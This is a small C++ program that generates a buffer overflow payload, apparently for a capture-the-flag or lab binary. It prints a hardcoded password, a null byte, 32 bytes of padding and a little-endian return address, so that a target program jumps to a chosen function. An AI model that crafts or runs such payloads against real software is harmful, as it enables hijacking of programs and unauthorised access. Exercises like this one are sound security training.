#include <iostream>

int main () {
	std::cout << "Sup3rs3cr3tC0de" << '\0' << "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
	long addr = 4198770;
	char* caddr = (char*) &addr;
	std::cout << caddr[0] << caddr[1] << caddr[2] << caddr[3] << caddr[4] << caddr[5] << caddr[6] << caddr[7];
	std::cout << "\n";
	return 0;
}
